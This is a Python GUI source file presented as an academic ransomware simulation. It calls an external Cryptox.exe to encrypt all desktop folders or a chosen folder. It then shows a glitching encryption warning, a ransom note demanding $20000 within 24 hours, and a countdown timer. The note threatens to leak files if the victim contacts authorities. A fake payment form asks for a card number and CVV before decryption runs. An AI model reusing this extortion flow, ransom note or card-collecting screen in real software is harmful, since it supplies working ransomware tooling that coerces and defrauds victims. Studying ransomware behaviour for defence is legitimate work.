"""
Cryptox – Ransomware Behavior Analysis Simulation Frontend
NOTE: For academic purposes only. This project demonstrates safe ransomware behavior simulation.

"""

import customtkinter as ctk
import tkinter as tk
from PIL import Image
import subprocess
import threading
import os
import random

CPP_EXECUTABLE = "Cryptox.exe"
GLITCH_CHARS = "#$%&@#$?#$%&@#$?"
FLASHY_GREEN = "#00FF41"
FONT_FAMILY = "Consolas"
PRO_BLUE_DARK = "#0D1B2A"
PRO_BLUE_LIGHT = "#1B263B"
PRO_TEXT_COLOR = "#E0E1DD"
PRO_ACCENT_COLOR = "#778DA9"


# --- Main Application Class ---
class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Cryptox - Ransomware Behavior Analysis Simulation")
        self.state('zoomed')

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        # --- State variables ---
        self.glitching_active = False
        self.pulsing_active = False
        self.is_warning_bright = False
        self.last_command_type = ""
        self.timer_seconds = 24 * 60 * 60
        self.timer_job = None
        self.bank_logo_image = None
        self.last_encrypted_path = None
        self.required_amount = 20000 
        self.required_recipient_id = 0

        # --- Tkinter StringVars for validation ---
        self.card_var = tk.StringVar()
        self.cvv_var = tk.StringVar()
        self.amount_var = tk.StringVar()
        self.recipient_var = tk.StringVar()
        
        self.card_var.trace_add("write", self._validate_payment_form)
        self.cvv_var.trace_add("write", self._validate_payment_form)
        self.amount_var.trace_add("write", self._validate_payment_form)
        self.recipient_var.trace_add("write", self._validate_payment_form)

        # --- Create all screens at startup ---
        self._create_main_control_screen()
        self._create_first_screen()
        self._create_info_screen()
        self._create_payment_screen()
        self._create_processing_screen()

        # Display the initial screen
        self.main_frame.grid(row=0, column=0, sticky="nsew")

    # --- Screen Creation Methods ---
    def _create_main_control_screen(self):
        """Creates the initial UI for file operations (ENCRYPT ONLY)."""
        self.main_frame = ctk.CTkFrame(self)
        self.main_frame.grid_columnconfigure(0, weight=1)
        self.main_frame.grid_rowconfigure(1, weight=1)
        
        control_frame = ctk.CTkFrame(self.main_frame)
        control_frame.grid(row=0, column=0, padx=20, pady=20, sticky="ew")
        control_frame.grid_columnconfigure(0, weight=1)
        control_frame.grid_columnconfigure(1, weight=0)

        title_label = ctk.CTkLabel(control_frame, text="Cryptox - Ransomware Behavior Analysis Simulation", font=ctk.CTkFont(size=24, weight="bold"))
        title_label.grid(row=0, column=0, columnspan=2, padx=10, pady=(10, 20))
        
        self.encrypt_desktop_btn = ctk.CTkButton(control_frame, text="Encrypt All Desktop Folders", command=self.encrypt_desktop, height=40)
        self.encrypt_desktop_btn.grid(row=1, column=0, columnspan=2, padx=10, pady=10, sticky="ew")
        
        self.folder_path_entry = ctk.CTkEntry(control_frame, placeholder_text="Enter full path to folder to encrypt...", height=35)
        self.folder_path_entry.grid(row=2, column=0, padx=10, pady=10, sticky="ew")
        
        self.browse_btn = ctk.CTkButton(control_frame, text="Browse...", command=self.browse_folder, width=100, height=35)
        self.browse_btn.grid(row=2, column=1, padx=(0, 10), pady=10, sticky="e")
        
        self.encrypt_folder_btn = ctk.CTkButton(control_frame, text="Encrypt Specific Folder", command=self.encrypt_folder, height=40)
        self.encrypt_folder_btn.grid(row=3, column=0, columnspan=2, padx=10, pady=5, sticky="ew")
        
        self.output_textbox = ctk.CTkTextbox(self.main_frame, state="disabled", font=("Courier New", 12))
        self.output_textbox.grid(row=1, column=0, padx=20, pady=(0, 20), sticky="nsew")

    def _create_first_screen(self):
        """Creates the animated 'encryption complete' screen."""
        self.hacker_screen_frame = ctk.CTkFrame(self, fg_color="#0F0E0E")
        
        self.glitch_label = ctk.CTkLabel(self.hacker_screen_frame, text="", font=("Courier New", 50, "bold"), text_color=FLASHY_GREEN, fg_color="transparent")
        self.glitch_label.place(relx=0.5, rely=0.4, anchor="center")
        
        message = "WARNING: Any attempt to terminate this operation can cause \n permanent loss of your data. Press the button below for more information."
        self.warning_label = ctk.CTkLabel(self.hacker_screen_frame, text=message, font=("Courier New", 20), text_color="#FF0000", fg_color="transparent")
        self.warning_label.place(relx=0.5, rely=0.5, anchor="center")
        
        self.hacker_continue_btn = ctk.CTkButton(self.hacker_screen_frame, text="How Do I Recover My Files?", command=self.show_info_screen, height=50, font=("Courier New", 20, "bold"), fg_color="#006400", hover_color="#00FF00", text_color_disabled="#CCCCCC")
        self.hacker_continue_btn.place(relx=0.5, rely=0.7, anchor="center", relwidth=0.5)

    def _create_info_screen(self):
        """Creates the info/timer screen."""
        self.info_screen_frame = ctk.CTkFrame(self, fg_color="black")
        self.info_screen_frame.grid_columnconfigure(0, weight=1)
        self.info_screen_frame.grid_rowconfigure(2, weight=1)

        cryptox_label = ctk.CTkLabel(self.info_screen_frame, text="C R Y P T O X", font=(FONT_FAMILY, 53, 'bold'), text_color=FLASHY_GREEN)
        cryptox_label.grid(row=0, column=0, pady=(30, 10), sticky="ew")

        self.info_timer_label = ctk.CTkLabel(self.info_screen_frame, text="", font=(FONT_FAMILY, 30, 'bold'), text_color=FLASHY_GREEN)
        self.info_timer_label.grid(row=1, column=0, pady=(10, 10), sticky="ew")

        content_frame = ctk.CTkFrame(self.info_screen_frame, fg_color='transparent')
        content_frame.grid(row=2, column=0, sticky="nsew", padx=20, pady=20)
        content_frame.grid_columnconfigure(0, weight=1) 
        content_frame.grid_columnconfigure(1, weight=3)
        content_frame.grid_rowconfigure(0, weight=1)

        self.info_image_frame = ctk.CTkFrame(content_frame, fg_color='black', border_width=2, border_color=FLASHY_GREEN)
        self.info_image_frame.grid(row=0, column=0, sticky='nsew', padx=(0, 1))
        self.info_image_label = ctk.CTkLabel(self.info_image_frame, text="", font=(FONT_FAMILY, 14), text_color='white')
        self.info_image_label.pack(expand=True, fill="both")
        self.info_image_frame.bind("<Configure>", self.load_and_resize_image)

        text_container = ctk.CTkFrame(content_frame, fg_color='black', border_width=2, border_color=FLASHY_GREEN)
        text_container.grid(row=0, column=1, sticky='nsew')
        text_container.grid_rowconfigure(0, weight=1) 
        text_container.grid_columnconfigure(0, weight=1)
        
        self.info_text_box = ctk.CTkTextbox(text_container, fg_color='transparent', text_color=FLASHY_GREEN, font=(FONT_FAMILY, 14), wrap='word')
        self.info_text_box.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
        self.info_text_box.configure(state='disabled')

        self.info_continue_btn = ctk.CTkButton(self.info_screen_frame, text="Proceed to Payment", command=self.show_payment_screen, height=50, font=("Courier New", 20, "bold"), fg_color="#006400", hover_color="#00FF00", text_color_disabled="#CCCCCC")
        self.info_continue_btn.grid(row=3, column=0, pady=(10, 20), padx=20, sticky="ew")
        
    def _create_payment_screen(self):
        """Creates the professional dark blue payment screen."""
        self.payment_screen_frame = ctk.CTkFrame(self, fg_color=PRO_BLUE_DARK)
        
        form_frame = ctk.CTkFrame(self.payment_screen_frame, fg_color=PRO_BLUE_LIGHT, corner_radius=10)
        form_frame.place(relx=0.5, rely=0.5, anchor="center")
        title_frame = ctk.CTkFrame(form_frame, fg_color="transparent")
        title_frame.pack(pady=(20, 25), padx=100)

        bank_logo_path = os.path.join("assets", "bank.png")
        if os.path.exists(bank_logo_path):
            try:
                pil_image = Image.open(bank_logo_path)
                self.bank_logo_image = ctk.CTkImage(pil_image, size=(85, 85))
                logo_label = ctk.CTkLabel(title_frame, image=self.bank_logo_image, text="")
                logo_label.grid(row=0, column=0, padx=(0, 5))
            except Exception as e:
                print(f"Error loading {bank_logo_path}: {e}") 

        title_label = ctk.CTkLabel(title_frame, text="Nexus Payment Gateway", font=ctk.CTkFont(family="Arial", size=28, weight="bold"), text_color=PRO_TEXT_COLOR)
        title_label.grid(row=0, column=1)

        ctk.CTkLabel(form_frame, text="Credit Card Number (16 digits)", text_color=PRO_TEXT_COLOR, anchor="w").pack(fill="x", padx=20)
        self.card_entry = ctk.CTkEntry(form_frame, textvariable=self.card_var, font=(FONT_FAMILY, 14), height=40, border_color=PRO_ACCENT_COLOR)
        self.card_entry.pack(fill="x", padx=20, pady=(0, 15))

        ctk.CTkLabel(form_frame, text="CVV Code (3 digits)", text_color=PRO_TEXT_COLOR, anchor="w").pack(fill="x", padx=20)
        self.card_entry = ctk.CTkEntry(form_frame, textvariable=self.cvv_var, font=(FONT_FAMILY, 14), height=40, border_color=PRO_ACCENT_COLOR)
        self.card_entry.pack(fill="x", padx=20, pady=(0, 15))
        
        self.amount_label = ctk.CTkLabel(form_frame, text=f"Amount (min. {self.required_amount})", text_color=PRO_TEXT_COLOR, anchor="w")
        self.amount_label.pack(fill="x", padx=20)
        self.amount_entry = ctk.CTkEntry(form_frame, textvariable=self.amount_var, font=(FONT_FAMILY, 14), height=40, border_color=PRO_ACCENT_COLOR)
        self.amount_entry.pack(fill="x", padx=20, pady=(0, 15))

        self.recipient_label = ctk.CTkLabel(form_frame, text="Recipient ID", text_color=PRO_TEXT_COLOR, anchor="w")
        self.recipient_label.pack(fill="x", padx=20)
        self.recipient_entry = ctk.CTkEntry(form_frame, textvariable=self.recipient_var, font=(FONT_FAMILY, 14), height=40, border_color=PRO_ACCENT_COLOR)
        self.recipient_entry.pack(fill="x", padx=20, pady=(0, 20))

        self.payment_error_label = ctk.CTkLabel(form_frame, text="", text_color="red", font=(FONT_FAMILY, 12))
        self.payment_error_label.pack(padx=20, pady=(0, 10))
        
        button_frame = ctk.CTkFrame(form_frame, fg_color="transparent")
        button_frame.pack(pady=20, padx=20, fill="x")
        button_frame.grid_columnconfigure(0, weight=1)
        button_frame.grid_columnconfigure(1, weight=1)

        back_button = ctk.CTkButton(button_frame, text="Back", 
                                    command=lambda: self.show_info_screen(resume_timer=True), 
                                    height=50, font=("Arial", 16, "bold"),
                                    fg_color=PRO_ACCENT_COLOR, hover_color="#9DB2BF")
        back_button.grid(row=0, column=0, padx=(0, 5), sticky="ew")

        self.decrypt_button = ctk.CTkButton(button_frame, text="Authorize & Decrypt", command=self.begin_decryption_process, height=50, font=("Arial", 16, "bold"), state="disabled")
        self.decrypt_button.grid(row=0, column=1, padx=(5, 0), sticky="ew")

    def _create_processing_screen(self):
        """Creates the fake processing screen for decryption."""
        self.processing_screen_frame = ctk.CTkFrame(self, fg_color=PRO_BLUE_DARK)

        container = ctk.CTkFrame(self.processing_screen_frame, fg_color=PRO_BLUE_LIGHT, corner_radius=10)
        container.place(relx=0.5, rely=0.5, anchor="center")

        self.processing_status_label = ctk.CTkLabel(container, text="...", font=("Arial", 18), text_color=PRO_TEXT_COLOR)
        self.processing_status_label.pack(pady=20, padx=50)

        self.progress_bar = ctk.CTkProgressBar(container, width=300)
        self.progress_bar.set(0)
        self.progress_bar.pack(pady=(0, 20), padx=50)
        
        self.finish_button = ctk.CTkButton(container, text="Finish & Exit", command=self.destroy, height=40, font=("Arial", 16))
        # Button is hidden by default and will be packed later

    # --- Screen Switching and Animation ---
    def _stop_all_animations(self):
        self.glitching_active = False
        self.pulsing_active = False
        if self.timer_job:
            self.after_cancel(self.timer_job)
            self.timer_job = None
            
    def _hide_all_frames(self):
        self.main_frame.grid_forget()
        self.hacker_screen_frame.grid_forget()
        self.info_screen_frame.grid_forget()
        self.payment_screen_frame.grid_forget()
        self.processing_screen_frame.grid_forget()

    def show_hacker_screen(self):
        self._stop_all_animations()
        self._hide_all_frames()
        self.hacker_screen_frame.grid(row=0, column=0, sticky="nsew")
        
        self.glitching_active = True
        self.pulsing_active = True
        self.glitch_effect()
        self.pulse_warning_text()

    def show_info_screen(self, resume_timer=False):
        """Switches to the info screen, generates data, and updates text."""
        self._stop_all_animations()
        self._hide_all_frames()
        
        if not resume_timer:
            self._generate_recipient_id()
            self.start_timer()
        
        self.info_text_box.configure(state='normal', font=(FONT_FAMILY, 20))
        self.info_text_box.delete('1.0', 'end')
        
        ransom_note = f"""READ THIS CAREFULLY:

Your files have been encrypted using a military-grade encryption algorithm. Therefore, there is no way to recover the files without a decryption key. The system will automatically restore your files once you pay ${self.required_amount} for the decryption key using an anonymous payment system such as Nexus. You have been given 24 hours to transfer the money to Wallet ID: {self.required_recipient_id}.

IMPORTANT NOTICE:

• Make the payment within the next 24 hours as discussed above. If not, your data will remain permanently encrypted.
• Do not tamper with any of the encrypted files as it may cause permanent deletion or corruption.
• Do not try to use any third-party software for the restoration of the files.
• If you attempt to contact the authorities, your personal files will be made publicly available on the internet.
• The fee for the decryption key is fixed. There is no room for negotiation.
"""
        self.info_text_box.insert('1.0', ransom_note) 
        self.info_text_box.configure(state='disabled')
        self.info_screen_frame.grid(row=0, column=0, sticky="nsew")
        
        if resume_timer and self.timer_job is None:
            self.update_timer()
        
    def show_payment_screen(self):
        """Switches to the payment screen and updates labels."""
        self.amount_label.configure(text=f"Amount (min. {self.required_amount})")
        self.recipient_label.configure(text=f"Recipient ID ({self.required_recipient_id})")
        self.amount_var.set("")
        self.recipient_var.set("")
        self._validate_payment_form()
        
        self._stop_all_animations()
        self._hide_all_frames()
        self.payment_screen_frame.grid(row=0, column=0, sticky="nsew")
        
    def show_processing_screen(self):
        self._stop_all_animations()
        self._hide_all_frames()
        self.processing_screen_frame.grid(row=0, column=0, sticky="nsew")
        self.progress_bar.set(0)
        self.finish_button.pack_forget()

    def show_control_screen(self):
        self._stop_all_animations()
        self._hide_all_frames()
        self.main_frame.grid(row=0, column=0, sticky="nsew")

    # --- Animation, Timer, and Validation Methods ---
    def _generate_recipient_id(self):
        """Generates a random 7-digit number."""
        self.required_recipient_id = random.randint(1000000, 9999999)

    def _validate_payment_form(self, *args):
        card_num = self.card_var.get()
        cvv_num = self.cvv_var.get()
        amount_str = self.amount_var.get()
        recipient_id_str = self.recipient_var.get()
        card_valid = len(card_num) == 16 and card_num.isdigit()
        cvv_valid = len(cvv_num) == 3 and cvv_num.isdigit()
        amount_valid = False
        try:
            if int(amount_str) >= self.required_amount:
                amount_valid = True
        except (ValueError, TypeError): pass
        recipient_valid = recipient_id_str == str(self.required_recipient_id)

        if card_valid and amount_valid and recipient_valid and cvv_valid:
            self.decrypt_button.configure(state="normal")
            self.payment_error_label.configure(text="")
        else:
            self.decrypt_button.configure(state="disabled")
            error_message = ""
            if len(card_num) > 0 and not card_valid: error_message = "Card number must be 16 digits."
            if len(cvv_num) > 0 and not cvv_valid: error_message = "CVV code must be 3 digits."
            elif len(amount_str) > 0 and not amount_valid: error_message = f"Amount must be a number >= {self.required_amount}."
            elif len(recipient_id_str) > 0 and not recipient_valid: error_message = f"Recipient ID must be exactly {self.required_recipient_id}."
            self.payment_error_label.configure(text=error_message)

    def glitch_effect(self):
        if not self.glitching_active: return
        base_text = "ALL YOUR FILES HAVE BEEN ENCRYPTED"
        glitched_text = "".join([random.choice(GLITCH_CHARS) if random.random() < 0.15 else char for char in base_text])
        self.glitch_label.configure(text=glitched_text)
        self.after(100, self.glitch_effect)

    def pulse_warning_text(self):
        if not self.pulsing_active: return
        self.warning_label.configure(text_color="#FF0000" if self.is_warning_bright else "#8B0000")
        self.is_warning_bright = not self.is_warning_bright
        self.after(800, self.pulse_warning_text)

    def start_timer(self):
        if self.timer_job is not None: self.after_cancel(self.timer_job)
        self.timer_seconds = 24 * 60 * 60
        self.update_timer()

    def update_timer(self):
        if self.timer_seconds >= 0:
            mins, secs = divmod(self.timer_seconds, 60)
            hours, mins = divmod(mins, 60)
            self.info_timer_label.configure(text=f"Time Left: {hours:02d}:{mins:02d}:{secs:02d}")
            self.timer_seconds -= 1
            self.timer_job = self.after(1000, self.update_timer)
        else:
             self.info_timer_label.configure(text="00:00:00")
             self.destroy()

    def load_and_resize_image(self, event):
        file_path = os.path.join("assets", "padlock.jpg")
        if not os.path.exists(file_path):
            self.info_image_label.configure(text=f"Error:\n'{os.path.basename(file_path)}'\nnot found in assets.", image=None)
            return
        try:
            img = Image.open(file_path)
            img.thumbnail((event.width - 20, event.height - 20), Image.Resampling.LANCZOS)
            photo = ctk.CTkImage(light_image=img, dark_image=img, size=(img.width, img.height))
            self.info_image_label.configure(image=photo, text="")
            self.info_image_frame.unbind("<Configure>")
        except Exception:
            self.info_image_label.configure(text="Error loading image.", image=None)

    # --- Core Application Logic ---
    def set_ui_state(self, is_running):
        state = "disabled" if is_running else "normal"
        buttons = [self.encrypt_desktop_btn, self.encrypt_folder_btn, self.browse_btn, self.hacker_continue_btn, self.info_continue_btn, self.decrypt_button]
        for btn in buttons:
            if hasattr(btn, 'configure'): btn.configure(state=state)
        
        self.folder_path_entry.configure(state=state)
        self.card_entry.configure(state=state)
        self.amount_entry.configure(state=state)
        self.recipient_entry.configure(state=state)

    def execute_cpp_command(self, command_list, command_type):
        if not os.path.exists(CPP_EXECUTABLE):
            self.log_message(f"ERROR: Executable '{CPP_EXECUTABLE}' not found!\n")
            return
        self.last_command_type = command_type
        self.set_ui_state(is_running=True)
        self.log_message(f"\n--- Running: {' '.join(command_list)} ---\n")
        thread = threading.Thread(target=self._run_subprocess, args=(command_list,))
        thread.start()

    def _run_subprocess(self, command_list):
        try:
            creation_flags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            process = subprocess.Popen(command_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=creation_flags, encoding='utf-8', errors='ignore')
            for line in iter(process.stdout.readline, ''): self.log_message(line)
            process.communicate()
        except Exception as e:
            self.log_message(f"\n--- PYTHON ERROR ---\nFailed to run: {e}\n")
        finally:
            if self.last_command_type == 'encrypt':
                self.after(100, self.show_hacker_screen)
            elif self.last_command_type == 'decrypt_final':
                self.after(100, self.show_decryption_complete)
            
            self.after(100, lambda: self.set_ui_state(is_running=False))
            self.log_message("--- Process Finished ---\n")
            
    def update_processing_status(self, message, progress):
        """Helper to update the processing screen's text and progress bar."""
        self.processing_status_label.configure(text=message)
        self.progress_bar.set(progress)

    def log_message(self, message):
        self.after(0, self._append_log, message)

    def _append_log(self, message):
        self.output_textbox.configure(state="normal")
        self.output_textbox.insert("end", message)
        self.output_textbox.see("end")
        self.output_textbox.configure(state="disabled")

    def browse_folder(self):
        folder_path = ctk.filedialog.askdirectory()
        if folder_path:
            self.folder_path_entry.delete(0, "end")
            self.folder_path_entry.insert(0, folder_path)

    # --- Button Command Methods ---
    def encrypt_desktop(self): 
        self.last_encrypted_path = None
        self.execute_cpp_command([f".\\{CPP_EXECUTABLE}", "encrypt-desktop"], 'encrypt')
    
    def encrypt_folder(self):
        folder = self.folder_path_entry.get()
        if folder: 
            self.last_encrypted_path = folder
            self.execute_cpp_command([f".\\{CPP_EXECUTABLE}", "encrypt", folder], 'encrypt')
        else: self.log_message("Please provide a folder path.\n")

    def begin_decryption_process(self):
        """Shows the processing screen and starts the fake status updates."""
        self.show_processing_screen()
        
        self.after(500, lambda: self.update_processing_status("Initiating transaction...", 0.1))
        self.after(2000, lambda: self.update_processing_status("Verifying payment details...", 0.4))
        self.after(4000, lambda: self.update_processing_status("Transaction confirmed. Payment successful.", 0.6))
        self.after(5500, lambda: self.update_processing_status("Initiating file recovery sequence...", 0.8))
        self.after(6500, self._start_actual_decryption)

    def _start_actual_decryption(self):
        self.log_message("--- Payment Authorized. Attempting recovery... ---\n")
        if self.last_encrypted_path:
            command = [f".\\{CPP_EXECUTABLE}", "decrypt", self.last_encrypted_path]
        else:
            command = [f".\\{CPP_EXECUTABLE}", "decrypt-desktop"]
        self.execute_cpp_command(command, 'decrypt_final')
    
    def show_decryption_complete(self):
        self.update_processing_status("Your files have been successfully recovered.\nThank you for your cooperation :)", 1.0)
        self.finish_button.pack(pady=20, padx=50, fill="x")

if __name__ == "__main__":
    app = App()
    app.mainloop()

